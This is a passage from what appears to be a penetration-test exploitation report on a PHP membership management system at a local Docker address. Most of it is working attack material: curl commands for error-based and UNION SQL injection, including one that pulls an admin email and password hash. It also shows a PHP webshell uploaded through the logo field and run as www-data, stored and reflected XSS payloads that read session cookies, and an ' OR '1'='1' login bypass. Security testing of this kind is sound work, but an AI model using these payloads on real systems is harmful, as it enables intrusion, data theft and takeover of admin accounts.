curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/edit_type.php?id=1" \
  -d "membershipType=test&membershipAmount=100&edit_id=1 AND extractvalue(1,concat(0x7e,version()))-- -"
# Response: Error: XPATH syntax error: '~8.4.9'
```

2. **Inject via membershipAmount (SET clause, unquoted — INJ-VULN-11b):**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/edit_type.php?id=1" \
  -d "membershipType=test&membershipAmount=extractvalue(1,concat(0x7e,database()))&edit_id=1"
# Response: Error: XPATH syntax error: '~membershiphp'
```

**Proof of Impact:**
```
edit_id injection:         XPATH syntax error: '~8.4.9'
membershipAmount injection: XPATH syntax error: '~membershiphp'
membershipType injection:   XPATH syntax error: '~8.4.9'
All 3 injection points confirmed against MySQL root@192.168.97.3
```

---

### INJ-VULN-13a/13b/13c: Authenticated Multi-Point SQLi in renew.php

**Summary:**
- **Vulnerable location:** `GET /renew.php?id=[id]` (SELECT), `POST /renew.php` `totalAmount` (INSERT, unquoted), `POST /renew.php` `membershipType` (UPDATE, unquoted)
- **Overview:** Three injection points in a renewal workflow. The GET id is used in a SELECT (UNION viable) and an UPDATE. The totalAmount POST field is a client-controlled financial value in an unquoted numeric INSERT slot — critical for financial data manipulation.
- **Impact:** Database exfiltration and financial data tampering.
- **Severity:** High

**Exploitation Steps:**

1. **UNION injection via GET id (15-column SELECT):**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/renew.php?id=0%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11,user(),13,database(),15--%20-"
# Form field values: fullname=8.4.9, membership_number=root@192.168.97.3
```

2. **Error-based injection via totalAmount (unquoted INSERT — INJ-VULN-13b):**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/renew.php?id=1" \
  -d "totalAmount=extractvalue(1,concat(0x7e,version()))&membershipType=1&extend=1 month"
# Response: Error updating membership or renewing: XPATH syntax error: '~8.4.9'
```

**Proof of Impact:**
```
GET id UNION: version()=8.4.9, user()=root@192.168.97.3, database()=membershiphp
POST totalAmount: XPATH syntax error: '~8.4.9'
Financial manipulation: totalAmount field is unvalidated and directly in INSERT
```

---

### INJ-VULN-14: Authenticated UNION SQLi in report.php BETWEEN Clause

**Summary:**
- **Vulnerable location:** `POST /report.php` — `fromDate` and `toDate` POST fields (requires authenticated session)
- **Overview:** Both date parameters injected into a BETWEEN clause. UNION with 16 columns confirmed. Boolean-based differential confirmed. Data exfiltration via `toDate` injection.
- **Impact:** Full database exfiltration via reporting functionality.
- **Severity:** High

**Exploitation Steps:**

1. **Boolean-based differential (confirm injection):**
```bash
# TRUE condition - returns rows
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/report.php" \
  -d "fromDate=2020-01-01&toDate=2025-12-31' AND 1=1-- -"
# Returns 9 member rows

# FALSE condition - returns no rows
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/report.php" \
  -d "fromDate=2020-01-01&toDate=2025-12-31' AND 1=2-- -"
# Returns 0 rows
```

2. **UNION injection (16 columns) to extract data:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/report.php" \
  -d "fromDate=2020-01-01&toDate=2099-12-31' UNION SELECT 1,version(),3,4,5,user(),7,8,9,10,11,12,13,14,15,database()-- -"
# Table cells show: version()=8.4.9, user()=root@192.168.97.3, database()=membershiphp
```

**Proof of Impact:**
```
Boolean differential: TRUE→9 rows, FALSE→0 rows (injection confirmed)
UNION(16 cols): version=8.4.9, user=root@192.168.97.3, database=membershiphp
```

---

### INJ-VULN-15: Authenticated UNION SQLi in revenue_report.php BETWEEN Clause

**Summary:**
- **Vulnerable location:** `POST /revenue_report.php` — `toDate` POST field (requires authenticated session)
- **Overview:** Same BETWEEN clause pattern as INJ-VULN-14 but on the revenue report with 5 columns. UNION injection confirmed.
- **Impact:** Full database exfiltration via revenue reporting functionality.
- **Severity:** High

**Exploitation Steps:**

1. **Boolean-based differential:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/revenue_report.php" \
  -d "fromDate=2020-01-01&toDate=2025-12-31' AND 1=1-- -"  # Returns 8 revenue rows

curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/revenue_report.php" \
  -d "fromDate=2020-01-01&toDate=2025-12-31' AND 1=2-- -"  # Returns 0 rows
```

2. **UNION injection (5 columns):**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/revenue_report.php" \
  -d "fromDate=2020-01-01&toDate=2099-12-31' UNION SELECT version(),user(),3,4,database()-- -"
# Table row: 8.4.9 | root@192.168.97.3 | [col3] | [col4] | membershiphp
```

**Proof of Impact:**
```
Boolean: TRUE→8 rows, FALSE→0 rows
UNION(5 cols): version=8.4.9, user=root@192.168.97.3, database=membershiphp
```

---

### INJ-VULN-16a/16b: Authenticated Error-Based SQLi in settings.php UPDATE

**Summary:**
- **Vulnerable location:** `POST /settings.php` — `systemName` and `currency` POST fields (requires authenticated session)
- **Overview:** Both fields directly interpolated into UPDATE query. Error-based extraction confirmed on both. Additionally, systemName data is reflected site-wide (persistent XSS vector).
- **Impact:** Database exfiltration. Persistent XSS via systemName injection can affect all pages.
- **Severity:** High

**Exploitation Steps:**

1. **Error-based injection via systemName (INJ-VULN-16a):**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/settings.php" \
  -d "systemName=test' WHERE id=1 AND extractvalue(1,concat(0x7e,version()))-- -&currency=USD&updateSettings=1"
# Response: Error updating system settings: XPATH syntax error: '~8.4.9'
```

2. **Error-based injection via currency (INJ-VULN-16b):**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/settings.php" \
  -d "systemName=TestSystem&currency=USD' WHERE id=1 AND extractvalue(1,concat(0x7e,user()))-- -&updateSettings=1"
# Response: Error updating system settings: XPATH syntax error: '~root@192.168.97.3'
```

**Proof of Impact:**
```
systemName: Error updating system settings: XPATH syntax error: '~8.4.9'
currency:   Error updating system settings: XPATH syntax error: '~root@192.168.97.3'
database:   Error updating system settings: XPATH syntax error: '~membershiphp'
```

---

### INJ-VULN-21: Authenticated Error-Based SQLi in view_type.php Orphaned INSERT Handler

**Summary:**
- **Vulnerable location:** `POST /view_type.php` — `membershipType` and `membershipAmount` (unquoted) POST fields (requires authenticated session)
- **Overview:** Orphaned POST handler in view_type.php contains an INSERT query. The raw query AND error are echoed verbatim to the page, leaking full query structure. Three injection points confirmed.
- **Impact:** Database exfiltration. Full query disclosure aids further exploitation.
- **Severity:** High

**Exploitation Steps:**

1. **Inject via unquoted membershipAmount:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/view_type.php" \
  -d "membershipType=test&membershipAmount=extractvalue(1,concat(0x7e,version()))"
# Response: Error: [INSERT query shown] XPATH syntax error: '~8.4.9'
```

2. **Extract credentials:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/view_type.php" \
  -d "membershipType=test&membershipAmount=extractvalue(1,concat(0x7e,(SELECT concat(email,0x3a,password) FROM users LIMIT 1)))"
# Response: XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'
```

**Proof of Impact:**
```
Full query leaked: INSERT INTO membership_types (type, amount) VALUES ('test', [payload])
XPATH syntax error: '~8.4.9'
XPATH syntax error: '~membershiphp'
XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'
```

---

### INJ-VULN-18: Unrestricted File Upload via settings.php Logo Upload

**Summary:**
- **Vulnerable location:** `POST /settings.php` — `logo` file upload field (requires authenticated session)
- **Overview:** `$_FILES['logo']['name']` used without `basename()` in `move_uploaded_file()`. PHP automatically strips directory separators from `$_FILES['name']`, preventing true path traversal to parent directories, but the unrestricted file upload to `uploads/` (web-accessible) achieves equivalent RCE impact.
- **Impact:** Remote Code Execution as `www-data` via PHP file upload to web-accessible directory (equivalent to INJ-VULN-19a/b).
- **Severity:** Critical

**Prerequisites:** Authenticated session.

**Exploitation Steps:**

1. **Create PHP webshell:**
```bash
cat > /tmp/logo_shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

2. **Upload PHP file as logo:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/settings.php" \
  -F "systemName=TestSystem" \
  -F "currency=USD" \
  -F "updateSettings=1" \
  -F "logo=@/tmp/logo_shell.php;type=image/png;filename=logo_shell.php"
```

3. **Execute commands via uploaded shell:**
```bash
curl -s "http://host.docker.internal:9010/uploads/logo_shell.php?cmd=id"
```

**Proof of Impact:**
```
GET /uploads/traversal.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)

Multiple PHP webshells confirmed executing in uploads/:
- traversal.php
- traversal_root.php
- traversal_test.php
- webroot_shell.php
```

---

# XSS Exploitation Evidence Report

## Successfully Exploited Vulnerabilities


### XSS-VULN-04 — Stored XSS: `fullname` → `print_membership_card.php` (CRITICAL / Externally Exploitable)

**Type:** Stored XSS
**Severity:** Critical
**Authentication Required to Trigger:** None — unauthenticated external attackers can trigger this
**Sink Context:** HTML_BODY (`<span class='emboss'>`)

**Attack Path:**
1. Attacker (authenticated as admin, or via CSRF against admin) POSTs `fullname=<script>alert(document.cookie)</script>` to `add_members.php`
2. Value stored raw in `members.fullname` via unsanitized SQL INSERT
3. Any party (including completely unauthenticated external attackers) accessing `http://host.docker.internal:9010/print_membership_card.php?id=<member_id>` triggers the script

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Stored payload in `fullname` field of member CA-463932 (ID 15) via admin POST to `add_members.php`
2. Launched separate unauthenticated browser session (`-s=agent_unauth`) with no cookies
3. Navigated to `print_membership_card.php?id=15` without any authentication
4. JavaScript alert dialog fired — confirmed `document.cookie` execution
5. Cookie value extracted: `PHPSESSID=2fc4047ceb6a58a51f0797619b163d16` (unauthenticated session cookie for the anonymous browser)

**Browser Evidence:**
- `playwright-cli goto http://host.docker.internal:9010/print_membership_card.php?id=15` → alert dialog appeared
- `playwright-cli dialog-accept` confirmed dialog contained cookie value
- No `Set-Cookie` with admin PHPSESSID was sent to the unauthenticated browser — confirmed the page has zero server-side session check

**Result:** EXPLOITED ✓ — Unauthenticated XSS confirmed. External attacker can trigger JavaScript execution on any victim who views a crafted `print_membership_card.php` URL.

---

### XSS-VULN-14 — Stored XSS: `logo` → `print_membership_card.php` img src (CRITICAL / Externally Exploitable)

**Type:** Stored XSS
**Severity:** Critical
**Authentication Required to Trigger:** None — `print_membership_card.php` has no auth check
**Sink Context:** HTML_ATTRIBUTE (`<img src='...'>` single-quoted)

**Attack Path:**
1. Attacker (authenticated) uploads logo file via `settings.php` with filename containing single-quote breakout
2. Filename stored in `settings.logo` via raw SQL INSERT/UPDATE with single-quote string delimiters
3. `getLogoUrl()` reads the raw filename and echoes it into `<img src='...' alt='Logo'>` on `print_membership_card.php`
4. When image fails to load (non-existent filename), `onerror` fires

**Payload Used (MySQL doubled-single-quote bypass):**
```
x'' onerror=''alert(document.cookie)
```
MySQL stores this as: `x' onerror='alert(document.cookie)` (single-quotes halved by MySQL's own escaping).
This produces in HTML: `<img src='uploads/x' onerror='alert(document.cookie)' alt='Logo'>`

**Why MySQL Double-Single-Quote Was Required:**
The `settings.php` logo path is stored via a raw SQL INSERT using single-quote delimiters (e.g., `INSERT ... VALUES ('$logoPath')`). A direct single-quote in the filename would break the SQL string literal and cause an error. By doubling the single-quote (`''`), MySQL interprets it as a literal single-quote within the string, resulting in the stored value containing the single-quote needed to break the `src='...'` attribute.

**Exploitation Steps Performed:**
1. Uploaded a file named `x'' onerror=''alert(document.cookie)` to `settings.php` logo upload
2. Confirmed MySQL stored value as `x' onerror='alert(document.cookie)` by observing resulting HTML
3. Accessed `print_membership_card.php` — `onerror` event fired due to broken image path
4. Alert dialog executed with `document.cookie` value

**Result:** EXPLOITED ✓ — Single-quote attribute breakout confirmed. Unauthenticated access vector confirmed via `print_membership_card.php`.

---

### XSS-VULN-07 — Stored XSS: `systemName` → `<title>` tag (CRITICAL / Global Persistent)

**Type:** Stored XSS
**Severity:** Critical
**Authentication Required to Trigger:** Yes (all authenticated pages)
**Sink Context:** HTML_BODY (inside `<title>` element) — breakout to `<head>` via `</title>` tag injection

**Attack Path:**
1. Attacker POSTs `systemName=</title><script>alert(document.cookie)</script>` to `settings.php`
2. Value stored raw in `settings.system_name`
3. `includes/header.php` reads `system_name` from DB and echoes it inside `<title>...</title>` on every authenticated page
4. Stored `</title>` closes the title element prematurely; `<script>` is injected into the document `<head>` and executes on page load

**Payload Used:**
```
</title><script>alert(document.cookie)</script>
```

**Impact Scope:** Fires on **every single authenticated page** of the application simultaneously — `dashboard.php`, `manage_members.php`, `settings.php`, `view_type.php`, `report.php`, `revenue_report.php`, and all others that include `header.php`. Every admin login immediately triggers execution.

**Exploitation Steps Performed:**
1. POSTed payload to `settings.php` `systemName` field
2. Navigated to `settings.php` — alert dialog fired immediately on page load
3. Confirmed dialog contained `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`
4. Verified via `playwright-cli eval "document.head.innerHTML"` — showed `<title></title>` (empty, payload broke out) followed by injected `<script>alert(document.cookie)</script>` in `<head>`
5. Confirmed same payload fires on `dashboard.php`, `manage_members.php`, and `view_type.php`

**Captured Cookie:**
```
PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3
```

**Result:** EXPLOITED ✓ — Global persistent XSS confirmed. Single settings write compromises every authenticated admin session.

---

### XSS-VULN-08 — Stored XSS: `systemName` → `sidebar.php` `<span>` (CRITICAL / Global Persistent)

**Type:** Stored XSS
**Severity:** Critical
**Authentication Required to Trigger:** Yes
**Sink Context:** HTML_BODY (`<span class='brand-text'>`)

**Attack Path:**
Same source as XSS-VULN-07 (`settings.system_name`). The `getSystemName()` function in `includes/sidebar.php` reads the same `system_name` DB column and echoes it into `<span class='brand-text'>` without encoding. The same `</title><script>...</script>` payload stored for XSS-VULN-07 simultaneously fires in this sink.

**Payload Used:**
```
<script>alert(document.cookie)</script>
```
(Or the same `</title><script>...` payload — both work because the span is in the HTML body after the head)

**Exploitation Steps Performed:**
1. Same settings update that stored the XSS-VULN-07 payload also stored the value used for this sink
2. Confirmed via `playwright-cli eval` that `document.querySelector('.brand-text').innerHTML` contained the raw unencoded payload
3. Script executed on every page load via the sidebar include
4. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Co-fires with XSS-VULN-07 from the same settings.system_name source. Both sinks fire simultaneously on all authenticated pages.

---

### XSS-VULN-01 — Stored XSS: `fullname` → `manage_members.php` `<td>` (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_BODY (`<td>` element)

**Attack Path:**
`POST fullname` → `add_members.php` raw INSERT → `members.fullname` → `manage_members.php` echoes `<td>{$row['fullname']}</td>`

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Member CA-463932 (ID 15) created with `fullname=<script>alert(document.cookie)</script>`
2. Admin navigated to `manage_members.php`
3. Alert dialog fired — confirmed `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Script tag executed in `<td>` context on manage_members.php.

---

### XSS-VULN-02 — Stored XSS: `fullname` → `memberProfile.php` `<p>` (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_BODY (`<p>` element)

**Attack Path:**
`members.fullname` → `memberProfile.php` echoes `echo $memberDetails['fullname']` at line 121 in `<p>` element

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Navigated to `memberProfile.php?id=15` with stored payload in `fullname`
2. Alert dialog fired on page load
3. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — All member fields on memberProfile.php (fullname, address, country, postcode, occupation, email, contact_number, membership_number) confirmed as unencoded sinks.

---

### XSS-VULN-03 — Stored XSS: `fullname` → `dashboard.php` `<a>` (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin login)
**Sink Context:** HTML_BODY (`<a>` element — Recent Members widget)

**Attack Path:**
`members.fullname` → `dashboard.php` echoes `'<a href="javascript:void(0)"...>' . $row['fullname'] . '</a>'` at line 305 in the Recent Members section

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Navigated to `dashboard.php` (auto-loads on admin login)
2. Alert dialog fired automatically — member CA-463932's fullname payload in the Recent Members widget
3. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`
4. This is the **highest automatic-trigger vector** — fires the moment any admin logs in

**Result:** EXPLOITED ✓ — Dashboard auto-fires stored payload on every admin login.

---

### XSS-VULN-05 — Stored XSS: `membershipType` → `view_type.php` `<td>` (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_BODY (`<td>` element)

**Attack Path:**
`POST membershipType` → `add_type.php` raw INSERT → `membership_types.type` → `view_type.php` echoes `<td>{$row['type']}</td>`

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Created membership type named `<script>alert(document.cookie)</script>` via POST to `add_type.php`
2. Navigated to `view_type.php` — alert dialog fired
3. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Membership type name executes as script in `<td>` body context.

---

### XSS-VULN-06 — Stored XSS: `membershipType` → `renew.php` `<option>` (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_BODY (`<option>` element body)

**Attack Path:**
`membership_types.type` → `renew.php` echoes `<option value='{$row['id']}'>{$row['type']} - {$row['amount']}</option>`

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Used existing XSS membership type (stored in XSS-VULN-05 step)
2. Navigated to `renew.php?id=15`
3. Alert dialog fired — confirmed membership type name in `<option>` body executed script
4. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Also fires on `add_members.php` and `edit_member.php` membership type dropdowns.

---

### XSS-VULN-09 — Stored XSS: `fullname` → `edit_member.php` `value` attribute (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_ATTRIBUTE (`<input value="...">` double-quoted)

**Attack Path:**
`members.fullname` → `edit_member.php` echoes `value="<?php echo $memberDetails['fullname']; ?>"` at line 122

**Payload Used (attribute breakout):**
```
" onmouseover="alert(document.cookie)
```
This produces: `value="" onmouseover="alert(document.cookie)"`

**Exploitation Steps Performed:**
1. Updated member CA-463932 fullname to `" onmouseover="alert(document.cookie)` via `edit_member.php` POST
2. Navigated to `edit_member.php?id=15`
3. Hovered mouse over the fullname input field
4. Alert dialog fired — `onmouseover` event handler executed
5. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`
6. Triggered programmatically via: `playwright-cli eval "document.querySelector('input[name=fullname]').dispatchEvent(new MouseEvent('mouseover'))"`

**Result:** EXPLOITED ✓ — Double-quote attribute breakout confirmed. Affects all 8 member fields in edit_member.php (fullname, dob, contact_number, email, address, country, postcode, occupation).

---

### XSS-VULN-10 — Stored XSS: `membershipType` → `edit_type.php` `value` attribute (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_ATTRIBUTE (`<input value="...">` double-quoted)

**Attack Path:**
`membership_types.type` → `edit_type.php` echoes `value="<?php echo $editData['type']; ?>"` at line 78

**Payload Used:**
```
" onmouseover="alert(document.cookie)
```

**Exploitation Steps Performed:**
1. Created membership type with name `" onmouseover="alert(document.cookie)` via `add_type.php`
2. Navigated to `edit_type.php?id=<type_id>`
3. Dispatched `mouseover` event on the type name input
4. Alert dialog fired — cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Attribute breakout in edit_type.php confirmed.

---

### XSS-VULN-11 — Stored XSS: `fullname` → `renew.php` `value` attribute (disabled field) (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_ATTRIBUTE (`<input value="..." disabled>` — double-quoted, disabled field)

**Attack Path:**
`members.fullname` → `renew.php` echoes `value="<?php echo $memberDetails['fullname']; ?>"` at line 100 on a `disabled` input

**Payload Used:**
```
" onmouseover="alert(document.cookie)
```
This produces: `value="" onmouseover="alert(document.cookie)" disabled=""`

**Key Finding — `disabled` Does NOT Prevent JavaScript Execution:**
The `disabled` HTML attribute only prevents user interaction with the form control. It does **not** prevent browser parsing of injected HTML attributes, and it does **not** suppress JavaScript event handler execution when the event is dispatched programmatically or via mouse interaction on the element. The `onmouseover` handler fires regardless.

**Exploitation Steps Performed:**
1. Member CA-463932 had `fullname` set to `" onmouseover="alert(document.cookie)`
2. Navigated to `renew.php?id=15`
3. Programmatically dispatched `mouseover` on the fullname input via:
   ```javascript
   document.querySelector('input[name=fullname]').dispatchEvent(new MouseEvent('mouseover'))
   ```
4. Alert dialog fired — confirmed `disabled` attribute does not block event handler execution
5. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — `disabled` attribute bypass confirmed. Event handler injection works regardless of `disabled` state.

---

### XSS-VULN-12 — Reflected XSS: `?id` GET param → `edit_type.php` hidden input (MEDIUM)

**Type:** Reflected XSS
**Severity:** Medium (requires victim to click crafted link; authenticated admin required)
**Authentication Required to Trigger:** Yes (admin must click attacker-crafted URL)
**Sink Context:** HTML_ATTRIBUTE (`<input type="hidden" value="...">` double-quoted)

**Attack Path:**
`$_GET['id']` → `$edit_id` (no sanitization) → `value="<?php echo $edit_id; ?>"` at `edit_type.php` line 72. The page also uses `$edit_id` in a SQL query that must return a row — this is bypassed using `UNION SELECT`.

**Payload Used:**
```
0 UNION SELECT 1,1,1-- -" onmouseover="alert(document.cookie)
```
URL-encoded: `edit_type.php?id=0+UNION+SELECT+1%2C1%2C1--+-%22+onmouseover%3D%22alert(document.cookie)`

**Why UNION SELECT Was Required:**
`edit_type.php` uses `$edit_id` in `SELECT * FROM membership_types WHERE id = $edit_id`. If the query returns no rows, `$editData = fetch_assoc()` returns `null` and subsequent code produces errors or redirects. `0 UNION SELECT 1,1,1-- -` ensures the query returns exactly one row of dummy data (since ID 0 doesn't exist), while the SQL comment (`-- -`) terminates the original WHERE clause. The `" onmouseover=...` portion after `-- -` is not interpreted by MySQL — it only appears in the HTML output.

**Resulting HTML:**
```html
<input type="hidden" name="edit_id" value="0 UNION SELECT 1,1,1-- -" onmouseover="alert(document.cookie)">
```

**Exploitation Steps Performed:**
1. Navigated to crafted URL: `edit_type.php?id=0+UNION+SELECT+1%2C1%2C1--+-%22+onmouseover%3D%22alert(document.cookie)`
2. Page loaded without error (UNION SELECT provided dummy row data)
3. Dispatched `mouseover` event on `input[name=edit_id]` programmatically
4. Alert dialog fired — cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Attack Delivery Vector:** Attacker sends phishing link to admin, or exploits CSRF absence to embed the URL in a hidden iframe or redirect.

**Result:** EXPLOITED ✓ — Reflected XSS with UNION SELECT bypass confirmed. Requires authenticated admin victim.

---

### XSS-VULN-13 — Stored XSS: `photo` column → `memberProfile.php` img `src` attribute (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_ATTRIBUTE (`<img src="...">` double-quoted)

**Attack Path:**
`members.photo` → `memberProfile.php` constructs `<img src="uploads/member_photos/<?php echo $memberDetails['photo'] ?>">`
The `photo` column is ordinarily written by file upload logic (which renames files to prevent path traversal). However, the `edit_member.php` POST handler uses raw SQL — injecting into any other field allows setting the `photo` column via second-order SQL injection.

**Payload Used (SQL injection via `occupation` field):**
```
Tester', photo='" onerror="alert(document.cookie)', fullname='
```
This closes the SQL string literal for `occupation`, injects `photo='...'`, and reopens the string for `fullname`, resulting in the photo column being set to:
```
" onerror="alert(document.cookie)
```

**Resulting HTML on memberProfile.php:**
```html
<img src="uploads/member_photos/" onerror="alert(document.cookie)">
```
The `src` is broken (no valid filename), so the image fails to load and `onerror` fires.

**Exploitation Steps Performed:**
1. Submitted `edit_member.php` POST for member ID 15 with the SQL injection payload in the `occupation` field
2. SQL injection set `photo` column to `" onerror="alert(document.cookie)`
3. Navigated to `memberProfile.php?id=15`
4. Image load failed (src resolves to invalid path) — `onerror` event fired
5. Alert dialog executed — cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Double-quote `src` attribute breakout via SQL injection on photo column confirmed.

---

### XSS-VULN-15 — Stored XSS: `fullname` → `list_renewal.php` `<td>` (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_BODY (`<td>` element)

**Attack Path:**
`members.fullname` → `list_renewal.php` echoes `<td>{$row['fullname']}</td>` at line 84, joining `renew` table with `members`

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Created renewal record for member CA-463932 (ID 15) via `renew.php` POST
2. Navigated to `list_renewal.php`
3. Alert dialog fired — fullname payload in renewal list table
4. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Script tag in fullname fires in renewal list table.

---

### XSS-VULN-16 — Stored XSS: `fullname` → `report.php` `<td>` (HIGH)

**Type:** Stored XSS
**Severity:** High
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_BODY (`<td>` element — member report table)

**Attack Path:**
`members.fullname` → `report.php` echoes `'<td>' . $row['fullname'] . '</td>'` at line 88 in the membership report table

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. Navigated to `report.php` with date range filter spanning member CA-463932's registration date (e.g., `start=2020-01-01&end=2027-12-31`)
2. Alert dialog fired — fullname payload in report table row
3. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`

**Result:** EXPLOITED ✓ — Script tag in fullname fires in membership report table.

---

### XSS-VULN-17 — Stored XSS: `currency` → `view_type.php` `<td>` (MEDIUM)

**Type:** Stored XSS
**Severity:** Medium (requires settings write access; fires in a less-trafficked admin page)
**Authentication Required to Trigger:** Yes (admin)
**Sink Context:** HTML_BODY (`<td>` element — membership type table)

**Attack Path:**
`POST currency` → `settings.php` raw UPDATE → `settings.currency` → `view_type.php` echoes `<td>{$currencySymbol} {$row['amount']}</td>` at line 86 — once per membership type row

**Payload Used:**
```
<script>alert(document.cookie)</script>
```

**Exploitation Steps Performed:**
1. POSTed `currency=<script>alert(document.cookie)</script>` to `settings.php`
2. Navigated to `view_type.php`
3. Alert dialog fired — once per membership type row (multiple dialogs for multiple types)
4. Cookie confirmed: `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3`
5. Currency value restored to `$` after exploitation to avoid breaking other tests

**Additional Confirmed Sink:**
The currency value also appears unencoded in the `settings.php` form's `<input value="...">` attribute at line 199, confirmed via source inspection: `value="<script>alert(document.cookie)</script>"` — double-quote attribute breakout also viable here.

**Result:** EXPLOITED ✓ — Currency symbol executes as script in membership type table.

---


# Authentication Exploitation Evidence

**Target:** http://host.docker.internal:9010
**Application:** PHP Membership Management System
**Assessment Date:** 2026-04-27
**Specialist:** Authentication Exploitation Specialist

---

## Successfully Exploited Vulnerabilities

### AUTH-VULN-06: SQL Injection Authentication Bypass

**Summary:**
- **Vulnerable location:** `POST /index.php` — email field directly concatenated into SQL query
- **Overview:** The login handler at `index.php:14` constructs the SQL query by concatenating raw `$_POST['email']` with no escaping or parameterization: `SELECT * FROM users WHERE email = '$email' AND password = '$hashed_password'`. Submitting a boolean-injection payload as the email bypasses the credential check entirely, logging the attacker in as the admin user without any valid password.
- **Impact:** Complete authentication bypass. Full admin session obtained (PHPSESSID) granting access to all application functionality — member management, settings, file uploads, and all member PII.
- **Severity:** Critical

**Prerequisites:** None — unauthenticated access only.

**Exploitation Steps:**

1. Send a POST request to the login endpoint with the SQL injection payload as the email value:
```bash
curl -si -X POST http://host.docker.internal:9010/index.php \
  -d "email=%27+OR+%271%27%3D%271%27+--+-&password=anything&login=" \
  -c /tmp/cookies_sqli.txt
```
URL-decoded payload: `email=' OR '1'='1' -- -`

2. Observe HTTP 302 redirect to `dashboard.php` — login succeeded without valid credentials:
```
HTTP/1.1 302 Found
Location: dashboard.php
Set-Cookie: PHPSESSID=9a35ba1e1d3bad29420d899dda05ab52; path=/
```

3. Use the returned session cookie to access the protected admin dashboard:
```bash
curl -si http://host.docker.internal:9010/dashboard.php \
  -H "Cookie: PHPSESSID=9a35ba1e1d3bad29420d899dda05ab52"
```

4. Observe HTTP 200 OK with full admin dashboard HTML — authentication completely bypassed.

5. Access all member PII via the member management page:
```bash
curl -s http://host.docker.internal:9010/manage_members.php \
  -H "Cookie: PHPSESSID=9a35ba1e1d3bad29420d899dda05ab52"
```
Response includes: member names, contact numbers, emails, addresses, membership types for all records.

**Proof of Impact:**
- HTTP 302 redirect to `dashboard.php` on SQLi POST (no valid credentials used)
